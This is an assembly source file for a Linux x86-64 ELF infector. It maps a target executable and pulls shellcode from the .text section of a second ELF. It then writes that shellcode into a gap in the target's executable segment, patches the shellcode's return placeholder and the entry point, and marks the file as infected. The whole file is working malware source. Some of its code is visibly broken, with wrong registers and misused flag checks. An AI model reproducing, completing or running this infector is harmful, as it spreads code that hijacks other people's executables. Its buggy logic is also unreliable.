			; calling convention -> f(r11, r12, r13, r14, r15)
%include "include/shared.s"

; TODO : might add a prolog even tho we don't use any variable so we don't have to push rbp every time (where ??)
				; remake progress line : 276
				; todo functions : all of them except print
				; re-made functions : print
; TODO : go to every `call print` and replace every r11 in `mov r11, STDOUT/STDERR`, with r11d (STDOUT/STDERR is 1 byte value) (this is done for now but check again in the future in case I added ne prints (I already know I'm gonna add one in good_elf_ptr))

; TODO : do the same thing but this time with the return values from main (search every "; the return value" commend)

; TODO : do the same with every other %definition in the include file (such as MAP_SHARED)

; TODO : both filed should be MAP_PRIVATE in mmap:

STRUC	stat
	before_size:	resb	48
	st_size:	resq	1
	stat_padding:	resb	88
ENDSTRUC

STRUC Elf64_Ehdr
	e_ident:	resb	ident_size
	e_type:		resw	1
	e_machine:	resw	1
	e_version:	resd	1
	e_entry:	resq	1
	e_phoff:	resq	1
	e_shoff:	resq	1
	e_flags:	resd	1
	e_ehsize:	resw	1
	e_phentsize:	resw	1
	e_phnum:	resw	1
	e_shentsize:	resw	1
	e_shnum:	resw	1
	e_shstrndx:	resw	1
ENDSTRUC

STRUC Elf64_Shdr
	sh_name:	resd	1
	sh_type:	resd	1
	sh_flags:	resq	1
	sh_addr:	resq	1
	sh_offset:	resq	1
	sh_size:	resq	1
	sh_link:	resd	1
	sh_info:	resd	1
	sh_addralign:	resq	1
	sh_entsize:	resq	1
ENDSTRUC

STRUC Elf64_Phdr
	p_type:		resd	1
	p_offset:	resd	1
	p_vaddr:	resq	1
	p_paddr:	resq	1
	p_filesz:	resq	1
	p_memsz:	resq	1
	p_flags:	resq	1
	p_align:	resq	1
ENDSTRUC

section .bss
	pivot_name:	resq	1	; the pivot's file name
	pivot_fd:	resq	1
	pivot_size:	resq	1
	pivot_data:	resq	1	; pointer to mapped data

	elf_fd:		resq	1
	elf_size:	resq	1
	elf_data:	resq	1	; pointer to mapped data

	shellcode:	resq	1	; shellcode address in memorry
	shellcode_size:	resq	1

section .text
	global _start

_start:
	cmp qword[rsp], 3		; argc
	je good_arg_count

	mov r11d, STDERR
	mov r12, usage
	mov r13d, usage_len
	call print
	
	mov r11d, ERR_BAD_USAGE		; the return value
	call exit

good_arg_count:
	;; saving one file name for later
	mov rax, [rsp + 0x10]		; pivot name
	mov [pivot_name], rax

	mov r11, [rsp + 0x18]		; elf name

	;;opening files
	mov r12, O_RDONLY
	call open

	mov [elf_fd], rax
	test rax, rax
	js open_err

next_open:
	mov r11, [pivot_name]
	mov r12, O_RDWR
	call open

	mov [pivot_fd], rax
	test rax, rax
	jns getting_sizes

open_err:
	mov r11d, STDERR
	mov r12, bad_open
	mov r13d, bad_open_len
	call print			; "couldn't open file!"

	mov r11d, ERR_BAD_OPEN		; the return value
	;; deciding which file to clean
	mov rax, [elf_fd]
	test rax, rax
	js exit				; no files have been opened
	jmp close_elf			; elf was opened but pivot wasn't

getting_sizes:
	mov r11, rax	 		; pivot_fd
	call get_file_size
	test rax, rax			; pivot_size < 0 ?
	jle file_size_err
	mov [pivot_size], rax

next_size:
	mov r11, [elf_fd]
	call get_file_size
	mov [elf_size], rax
	test rax, rax			; elf_size < 0 ?
	jg mapping

file_size_err:
	;; comparing both sizes against -1 (fstat failed) and 0 (empty file)
	mov rax, [elf_size]
	test rax, rax
	je an_empty_file
	js failed_fstat

	;

	mov rax, [pivot_size]
	test rax, rax
	js failed_fstat

an_empty_file:
	mov r11d, STDERR
	mov r12, empty_file
	mov r13d, empty_file_len
	call print			; "empty file!"

	mov r11d, ERR_EMPTY_FILE	; the return value
	jmp close_files			; cleaning resources

failed_fstat:
	mov r11d, ERR_BAD_FSTAT		; the return value
	jmp close_files			; cleaning resources

mapping:
	mov r11, rax			; elf_size
	mov r12, MAP_PRIVATE
	mov r13, [elf_fd]
	call mmap
	mov [elf_data], eax

	cmp rax, -1			; this can't be replaced with a test rax, rax
	; if we jumped to mmap_err we have to figure out if we mapped any of the files correctly so
	; we know if we should unmap them before exiting, for that I'll use ebx
	; pivot wasn't mapped -> ebx = 1
	; elf wasn't mapped -> ebx = 0
	jne next_map
	xor ebx, ebx
	jmp mmap_err

next_map:
	mov r11, [pivot_size]
	mov r12, MAP_SHARED
	mov r13, [pivot_fd]
	call mmap
	mov [pivot_data], rax

	cmp rax, -1			; this can't be replaced with a test rax, rax
	jns after_mapping
	mov ebx, 1

mmap_err:
	mov r11d, ERR_BAD_MMAP		; the return value
	; ebx has a hint of what file failed to map
	test ebx, ebx
	je close_files			; elf failed -> nothing was mapped -> close files an exit
	jmp unmap_elf			; pivot mapped ->  elf was mappde -> unmap elf, close files then exit

after_mapping:
	; next we have to check if both the target file and the payload are 64 bit little endian, if not we exit
	mov r11, [pivot_data]
	call is_target_elf		; returns -1 for false, 0 for true
	test rax, rax			; is this a good file ?
	jne arch_err

	mov r11, [elf_data]
	call is_target_elf
	test rax, rax			; is this a good file ?
	je checking_infection		; we have the right file

arch_err:
	mov r11d, ERR_NOT_TARGET	; the return value
	jmp clean

checking_infection:
	; in the end of each infection we leave a special mark @ EI_PAD offset, checking those bytes should
	; yeld if the file is already infected or not

	mov r11, mark
	mov r12, [pivot_data]
	add r12, EI_PAD
	call strcmp

	test rax, rax
	jne extract_shellcode

	;; printing "$FILE_NAME is already infected"
	; printing the file name
	mov r11, [pivot_name]
	call strlen

	mov r12, r11
	mov r13, rax
	mov r11d, STDERR
	call print

	; print the rest of the string
	mov r11d, STDERR 
	mov r12, infected
	mov r13d, infected_len
	call print

	mov r11d, ERR_INFECTED		; the return value
	jmp clean

extract_shellcode:

	mov r11, [elf_data]
	mov r12, shellcode_size
	call find_shell			; returns a pointer to the .text section, and initialiazes
					; the shellcode_size variable

	test rax, rax			; shellcode == NULL ?
	jne next
	mov r11d, ERR_NO_SHELL		; the return value
	jmp clean

next:
	mov [shellcode], rax
		
patching:
	mov r11, rax			; the shellcode address
	mov r12, [shellcode_size]
	mov r11, 0x6969696969696969	; the QWORD to replace in the shellcode
	; sending the pivot's entry point so we can replace that marker with it
	mov r13, [pivot_data]
	add r13, e_entry

	call patch_jump_point
	test rax, rax			; was the marker found and replaced ?
	jns segments

	mov r11d, ERR_NO_MARKER		; the return value
	jmp clean			; marker wasn't found -> we can't continue the infection
	
segments:
	;; parse the segment headers and find a gap in the executable one
	; getting a pointer to the segment base
	mov rax, [pivot_data]
	mov rbx, [rax + e_phoff] 	; we need eax to stay the same for a while ; TODO : optimize this line
	add rbx, rax
	sub rbx, Elf64_Phdr_size	; pointer to the program headers base - 1 * Elf64_Phdr_size

	; getting p_phnum
	mov cx, word[eax + e_phnum]
	movzx ecx, cx

next_segment:

	dec ecx
	js no_segment

	add rbx, Elf64_Phdr_size 	; segment ++

	mov rdx, [rbx + p_type]		; checking the segment type
	and edx, PT_LOAD
	je next_segment			; not a loadable segment

	mov rdx, [rbx + p_flags]
	add edx, PF_X
	je next_segment			; not an executable segment
	
	jmp segment_found

no_segment:
	; this shouldn't really happen in normal executables that weren't manually edited
	mov r11, ERR_NO_XL_SEG		; the return value
	jmp clean

segment_found:
	; now that we found a target segment, we have to find a suitable gap to store our shellcode
	mov r11, [pivot_data]
	mov r12, rbx			; the target segment header
	mov r13, [rbx + p_filesz]	; TODO : might calculate this value in find_gap
					; TODO : add a check for weird values like sections that have a size of 0
					; and number of sections and segments exceeds 0xffff
	mov r14, [shellcode_size]
	call find_gap
	test rax, rax			; gap == NULL ?
	jne next2
	mov r11, ERR_NO_GAP		; the return value
	jmp clean

next2:
	; copying the shellcode ; TODO : rename next2 with shell_copy: or smtg
	mov r11, rax			; the gap address
	mov r12, [shellcode]
	mov r13, [shellcode_size]
	call copy_data

	; now that everything is validated all we have to do is
	;	1 - pacth entry point
	;	2 - leave mark
	;	3 - unmap and close the files
	;	4 - ???
	;	5 - profit

	;; patching the entry point
	; rax has the gap offset in memorry, we have to get the gap offset in file, then add it to the old 
	; entry point value
	; rbx should still have an Elf64_Phdr pointer to the target segment and (?? lol)
	mov rdx, [rbx + p_vaddr]
	sub rax, [pivot_data]	; get the gap offset in file
	add rax, rdx		; the new entry point value (aka where the shellcode is gonna be in memorry)
	mov rbx, [pivot_data]	; TODO : might use a lea here
	add rbx, e_entry
	mov [rbx], rax		; patching the entry point
	;

leaving_mark:
	mov r11d, STDOUT
	mov r12, marking
	mov r13d, marking_len
	call print		; "leaving mark .."
	
	mov rax, [pivot_data]
	add rax, EI_PAD		; pointing to EI_PAD
	mov r11, rax		; TODO : might replace with `mov r11, [rax + EI_PAD]' or `mov r11, [pivot_data + EI_PAD]
	mov r12, mark
	call strlen
	mov r13, rax
	call copy_data

	mov r11, [pivot_name]
	call strlen

	mov r12, r11
	mov r13d, eax
	mov r11d, STDOUT
	call print		; $FILE

	mov r11d, STDOUT
	mov r12, enjoy
	mov r13d, enjoy_len
	call print		; " has been infected"

	mov r11, SUCCESS	; the return value


clean:
	unmap_files:
		unmap_elf:
			mov r11, [elf_data]
			mov r12, [elf_size]
			call unmap

		unmap_pivot:
			mov r11, [pivot_data]
			mov r12, [pivot_size]
			call unmap
	close_files:
		close_pivot:
			mov r11, [pivot_fd]
			call close
		close_elf:
			mov r11, [elf_fd]
			call close

	call exit		; the return value is loaded into r11 before jumping to clean



open:	; int open(char *file, int flags);

	xor eax, eax
	mov rsi, r12
	mov rdi, r11
	add al, 2
	syscall

	ret


mmap:	; void* mmap(QWORD size, int flags, int fd);

	; TODO : this function might have some pre-syscall problem (idk, just make sure in case)
	xor eax, eax

	xor edx, edx
	xor edi, edi			; the kernel is free to map at any random addres
	mov rsi, r11			; file size
	mov r10, r10			; flags
	mov r8, r13			; file descriptor
	xor r9, r9			; offset
	add al, 9			; sys_mmap
	add dl, PROT_READ_WRITE		; the whole goal is to be able to edit both files in memory
	syscall

	mov rbx, rax
	shr rbx, 56			; TODO replace with the other shift instruction that shitfs the register around (probably rol)
	cmp bl, 0xff			; TODO : replace with test
	jne ret_mmap

mapping_error:
	mov eax, -1			; TODO : replace with rax ?
	mov r11d, STDOUT
	mov r12, bad_mmap
	mov r13d, bad_mmap_len
	call print
	
ret_mmap:
	ret



copy_data:	; void *copy_data(void *dst, void *src, QWORD size); basically an memcpy()

	push rsi	; TODO : might not have to save those
	push rdi

	mov rdi, r11
	mov rsi, r12
	mov rcx, r13

copying_loop:
	dec rcx
	js copied

	movsb
	jmp copying_loop

copied:
	mov r11d, STDOUT
	mov r12, shell_copied
	mov r13d, shell_copied_len
	call print ; "shell copied!"
	
	pop rdi
	pop rsi
	ret



find_gap:	; void *find_gap(void *data, void *segment, QWORD seg_size, QWORD shellcode_size)

	; saving used registers
	push rbx
	push rcx
	push rdx
	;

method1:	; checking between-segments gaps, this should work most of the time duo to in-file segements
		; alignements

	
	; r12 has the target segement's header
	mov rbx, [r12 + p_offset]
	add rbx, [r12 + p_filesz]	; we have a pointer to the end of the segment in file

	; now getting the offset of the next segment

	mov rax, r12
	add rax, Elf64_Phdr_size	; segment_Phdr ++
	mov rcx, [rax + p_offset]	; pointer to the start of the next segment

	sub rcx, rbx			; rcx should have the gap size now
	cmp rcx, r14			; gap_size > shellcode_size ?
	jl method2			; the shellcode won't fit in the gap
	; gap =  (segment_Phdr -> offset + segment_Phdr -> filesz)(rbx) + memorry base (r11)
	add rbx, r11			; gap offset in file + memorry base = gap address in memorry
	mov rax, rbx			; the return value
	jmp ret_gap

method2:	; checking the in-segments 0-blocks
	xor eax, eax			; the size of the current gap
	mov rbx, r12			; void *segment in memorry	; TODO : view the 32 bit version
									; for this long-boi comment

	add rbx, [rbx + p_offset]	; TODO : comment these 2 lines
	add rbx, r11

	mov rcx, -1			; the loop counter
	; r13 has the segment size

parsing_data:
	inc rcx				; ++i
	cmp rcx, r13			; i > seg_size ?
	je no_gap

	cmp byte[rbx + rcx], 0		; segment[i] == 0 ?
	jne check_and_reset
	inc rax				; ++ gap_size
	jmp parsing_data

check_and_reset:
	; r14 has the shellcode size
	cmp rax, r14			; gap_size => shellcode_size ?
	jl reset_counter
	; we have a valid gap @ segment + i - current_size
	sub rcx, rax			; i - current_size
	add rbx, rcx			; segment + i - current_size
	mov rax, rbx			; the return value
	jmp ret_gap

reset_counter:
	xor eax, eax			; gap_size = 0
	jmp parsing_data

no_gap:
	mov r11d, STDERR
	mov r12, no_gap_found
	mov r13d, no_gap_found_len
	call print
	xor eax, eax			; gap = NULL

ret_gap:
	; rax has the right value we juqst have to restore registers and return
	pop rdx
	pop rcx
	pop rbx

	ret



patch_jump_point:	; void patch_jump_point(char *shellcode, size_t size, QWORD marker, QWORD entry_point)

	;storing used registers
	push rbx
	push rcx
	push rdx
	;
	mov rax, r11	; shellcode
	mov rcx, r12	; size
	mov rdx, r13	; the marker which is 0x6969696969696969 in this case
	; the combo rax + rcx pointer at the last byte in the shellcode (\0) but we need it to point to the last
	; valid QWORD
	; so -1 byte for (\0) and -7 for the last QWORD
	sub rcx, 7	; this might should be 7 (debug!!)

marker_loop:
	cmp qword[rax + rcx], rdx
	je found_marker

	dec rax
	jns marker_loop; buff[0] is a valid qword as well

no_mark_found:
	mov r11d, STDERR
	mov r12, no_marker
	mov r13d, no_marker_len
	call print
	mov rax, -1	; returns FALSe
	jmp ret_patch

found_marker:
	mov rbx, r11		; the original entry point
	mov [rax + rcx], rbx	; pacthing the shellcode return address
	xor eax, eax		; returns TRUE

ret_patch:
	;restoring saved registers
	pop rdx
	pop rcx
	pop rbx

	ret	
	



find_shell:	; void *find_shell(void *data, size_t shellcode_size); returns a pointer to the .text section and stores the shellcode size

	push rbp
	mov rbp, rsp
	sub rsp, 0x18	; since we're declaring some local variables
	;[rbp - 8] 	-> ELf64_Shdr *section = (char *)data + h_ptr -> e_shoff 
	;[rbp - 0x10] 	-> Elf64_Shdr *text; unitializes 
	;[rbp - 0x12]	-> (2 bytes value) WORD section_count = h_ptr -> e_shnum
	; 6 bytes for alignements

	;saving used registers
	push rbx
	push rcx
	push rdx

	; we have *data in r11

	; taking care of the generic section pointer
	mov rdx, [r11 + e_shoff]
	add rdx, r11
	mov [rbp - 8], rdx

	;; getting a pointer to the string table section into rdx
	mov ax, word[r11 + e_shstrndx]
	mov cl, Elf64_Shdr_size
	mul cl		; rax now has the string table section header offset in file, and r11 has the sections base in memorry
	add rax, r11	; rax now has the string table offset in memorry
	mov rdx, rax	; from now on, rdx will have the pointer, we're gonna use this later

	;;taking care of the section_count variable (@ rbp - 0x12)
	mov ax, [r11 + e_shnum]
	mov [rbp - 0x12], ax

	mov r14, r11	; saving those registers since they're gonna be used in parsing_loop
	mov r15, r12	; to pass arguments of strcmp and later to print

	;; parsing the sections and returning the address of .text
	xor rcx, rcx
	mov r11, target_section		; argument to strcmp

parsing_loop:
	mov rax, [rbp - 0x8]		; the generic section pointer, by default it points to the first section
	; get the sh_name and add it to rdx (the string table offset)
	mov r12, [rax + sh_name]
	add r12, rdx
	call strcmp
	test rax, rax			; did we find the section ?
	je found_text_section
	; section ++
	add dword[rbp - 0x8], Elf64_Shdr_size
	;

	inc rcx
	cmp cx, word[rbp - 0x10]	; e_shnum
	jne parsing_loop

no_text_section:
	xor eax, eax			; text = NULL
	mov r11d, STDERR
	mov r12, no_text
	mov r13d, no_text_len
	call print
	sub rsp, 0x18
	jmp ret_text_section

found_text_section:
	; restoring r11, and r12
	mov r11, r14
	mov r12, r15

	; storing the address of the section header
	mov rax, [rbp - 8]		; the section header pointer
	mov rcx, rax			; for storing the size later
	mov rax, [rax + sh_offset]	; the actual section offset
	add rax, r11			; the offset in memorry, this value will be returned

	; storing the size
	mov rcx, [rcx + sh_size]
	mov [r12], rcx
	sub rsp, 0x18

ret_text_section:
	pop rdx
	pop rcx
	pop rbx

	ret	

unmap:	; void unmap(void *data, size_t size);

	push rax

	xor eax, eax
	mov rdi, r11
	mov rsi, r12
	add al, 0xb
	syscall

	pop rax
	ret



close:	; void close(int fd);

	push rax

	xor eax, eax
	mov rdi, r12
	add al, 3
	syscall

	pop rax
	ret



get_file_size:	; size_t get_file_size(int fd);

	sub rsp, stat_size	; make space for the stat structure in the stack

	xor eax, eax
	mov rsi, r11
	mov rdx, rsp
	add al, 0x5		; sys_newfstat
	syscall

	mov rax, [rsp + st_size]
	add rsp, stat_size	; clean the stucture buffer

	test rax, rax
	jns after_stat		; TODO : rename this label ret_size

	mov r11d, STDERR
	mov r12, bad_stat
	mov r13d, bad_stat_len
	call print

	mov rax, -1		; TODO:replace with `mov al, -1`, since rax but the LSB should be 0xffff.. already
	
after_stat:

	ret



print:	; void print(int fd, char *buf, size_t len);


	; saving used registers
	push rax
	push rdx
	push rsi
	push rdi
	; performing the syscall
	mov eax, 1
	mov rdi, r11
	mov rsi, r12
	mov rdx, r13
	syscall
	; restoring saved registers

	pop rdi
	pop rsi
	pop rdx
	pop rax
	
	ret



strlen:	; size_t strlen(char *buff);

	;saving used register
	push rcx
	push rsi

	mov rsi, r11
	mov rcx, -1

strlen_loop:
	inc rcx
	lodsb
	test al, al
	jne strlen_loop

	mov rax, rcx	; the return value
	; restoring saved register
	pop rsi
	pop rcx
	;
	ret
is_target_elf:	; int is_target_elf(void *data);a

	; checking the magic bytes
	cmp dword[r11], 0x464c457f	; '\x7f' + "ELF"
	je good_elf_ptr

	mov r11d, STDERR
	mov r12, bad_elf
	mov r13d, bad_elf_len
	call print
	mov rax, -1
	jmp ret_arch



good_elf_ptr:
	add r11, 4
	cmp byte[r11], ELFCLASS64
	je is_64_bit

	jmp ret_arch

is_64_bit:
	xor eax, eax	; the return value

ret_arch:
	ret



strcmp:	; bool strcmp(char *known_buff, char *unkown_buff);

	; saving used registers
	push rbx
	push rcx
	push rdx

	; first we get the length of the first arg
	call strlen		; the first arg is  already in r11
	mov ecx, eax		; we're dealing with small const strings
	mov rax, r11
	mov rbx, r12
	dec ecx			; array index

cmp_loop:
	; edx will be used to hold the actual bytes
	mov dl, byte[rax + rcx]
	mov dh, byte[rbx + rcx]
	xor dh, dl
	jne diff_buffers

	dec ecx			; dec does take care of the flags
	jns cmp_loop
	jmp same_buffers

diff_buffers:
	mov rax, -1		; returning FALSE
	jmp end

same_buffers:
	xor eax, eax		; returning TRUE

end:
	; restoring saved resgiters
	pop rdx
	pop rcx
	pop rbx

	ret



exit:	; void exit(int error status);

	xor eax, eax
	mov rdi, r11
	add al, 60
	syscall
